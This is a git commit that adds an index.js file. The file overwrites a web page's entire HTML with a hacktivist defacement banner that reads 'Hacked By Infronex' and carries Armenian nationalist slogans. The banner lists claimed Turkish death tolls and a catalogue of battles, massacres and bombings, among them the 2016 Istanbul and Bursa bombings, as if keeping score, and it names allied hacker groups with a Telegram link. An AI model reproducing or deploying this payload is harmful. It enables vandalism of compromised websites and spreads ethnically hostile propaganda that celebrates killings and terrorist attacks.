c863427a5b28a9e0d717cf8f46ac07f2aad6e085
h4ckrg <hackrg@mail.ru>
2025-05-27 01:09:36 +0400

    Create index.js

---
+++ index.js
@@ -0,0 +1,128 @@
+document.documentElement.innerHTML = `<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-4Q6Gf2aSP4eDXB8Miphtr37CMZZQ5oXLH2yaXMJ2w8e2ZtHTl7GptT4jmndRuHDT" crossorigin="anonymous">
+    <link rel="stylesheet" href="style.css">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Noto+Sans+Armenian:wght@100..900&display=swap"
+        rel="stylesheet">
+    <title>Document</title>
+    <style>
+        body {
+            background-color: #333;
+            color: #fff;
+        }
+    </style>
+</head>
+
+<body class="container">
+    <h1 class="text-center" style="margin-top: 50px; color: #02d63d; font-weight: bolder;">Hacked By Infronex</h1>
+    <h2 class="text-center">We are Anonymous (Artsakh is Armenia)</h2>
+    <div class="d-flex gap-5 mt-5 align-items-start">
+        <div style="width: 100%">
+            <h2 style="color: red; font-weight: bold;">Turkish Deads</h2>
+            <div style="color: red; font-weight: bold;" class="d-flex mt-3" style="font-size: 20px;">
+                <ul style="width: 100%;" style="list-style-type: none;">
+                    <li style="list-style-type: none;">-2.3m🇹🇷</li>
+                    <li style="list-style-type: none;">-5.5m🇹🇷</li>
+                    <li style="list-style-type: none;">-1.5m🇹🇷</li>
+                    <li style="list-style-type: none;">-85k🇹🇷</li>
+                    <li style="list-style-type: none;">-50k🇹🇷</li>
+                    <li style="list-style-type: none;">-53k🇹🇷</li>
+
+                    <li style="list-style-type: none;">-300🇹🇷</li>
+                    <li style="list-style-type: none;">-15🇹🇷</li>
+                </ul>
+                <ul style="width: 100%; list-style-type: none;">
+                    <li>-384k🇹🇷</li>
+                    <li>-30k🇹🇷</li>
+                    <li>-15k🇹🇷</li>
+                    <li>-8k🇹🇷</li>
+                    <li>-30k🇹🇷</li>
+                    <li style="list-style-type: none;">-5k🇹🇷</li>
+                    <li style="list-style-type: none;">-10k+🇹🇷</li>
+                    <li style="list-style-type: none;">-600k 🇹🇷</li>
+                </ul>
+                <ul style="width: 100%; list-style-type: none;">
+                    <li>-3m🇹🇷</li>
+                    <li>-66🇹🇷</li>
+                    <li>-23,844🇹🇷</li>
+                    <li>-900🇹🇷</li>
+                    <li>-340k🇹🇷</li>
+                </ul>
+            </div>
+        </div>
+        <div
+            style="width: 100%; box-shadow: 0 0 45px rgba(2, 214, 61, 0.5); border: 2px solid #02d63d; border-radius: 40px;">
+            <img style="width: 100%; border-radius: 40px;"
+                src="https://avtobaku.s3.amazonaws.com/uploads/user/avatar/5771/medium_image.png" alt="">
+        </div>
+        <div style="width: 100%; font-size: 13px;">
+            <p style="color: red; font-weight: bold;">
+                1) Oparation Zilan
+                2) Oparation of demirkapı
+                3) Defans of norsah
+                4) Siege of başeri
+                5) Oparation ığdır
+                6) Oparation Kars
+                7) Oparation karaklise
+                8) Oparation Eleşkirt
+                9) Battle of Siirt
+                10) Battle of Varto
+                11) battle of Elazığ
+                12) battle of Bingol
+                13) Oparation claw eagle 1
+                14) Oparation claw eagle 2
+                15) battle of Van
+                16) Oparation tendürek
+                17) second Ararat revolt
+                18) battle of Bingol province center
+                19) battle of dareheni City Center
+                20) battle of hani subdistrict
+                21) 1959 kirkuk massacare
+                22) battle of Doğubayazıt
+                23) Bedirhan beg revolt 🇹🇷20.000 kill
+                24) Botan attack on ottaman
+                25) soran attack on ottaman
+                26) Cizre revolt
+                27) Battle of Çemişgezek
+                28) capture of kutahya
+                29) battle of hama
+                30) capture of baalbek
+                31) capture of adana
+                32) Capture of mosul
+                33) Battle of Diyarbakır
+                34) Battle of rewdanviz
+                35) battle of alkos
+                36) battle of muzayrib
+                37) Siege of damacus
+                38) capture of khoy
+                39) capture of ranıya
+                40) capture of Amed
+                41) capture of maden
+                42) capture of Akara
+                43) capture of zibar
+                44) battle of sinjar
+                45) battle of zapt
+                46) Oparation kıran
+                47) 1984 PKK attack
+                48) march 2016 İstanbul bombing
+                49) 2016 bursa bombing
+            </p>
+        </div>
+    </div>
+    <p class="mt-5 text-center">We are already collabaratoring with Cyber Gray, HXH, Hoparner, Anonymous Armenia and
+        MMCA (Monte Melkonian Cyber
+        Army), HackRG, UUID</p>
+    <footer
+        style="background: #000; padding: 20px !important; box-shadow: 0 0 45px rgba(0, 0, 0, 0.5); border-radius: 15px; margin-top: 30px;">
+        <p style="margin: 0; text-align: center;">&copy; Hacked by Armenian Hackers <a
+                style="color: #02d63d; font-weight: bold;" href="https://osInfronex.t.me">Infronex</a></p>
+    </footer>
+</body>
+
+</html>`
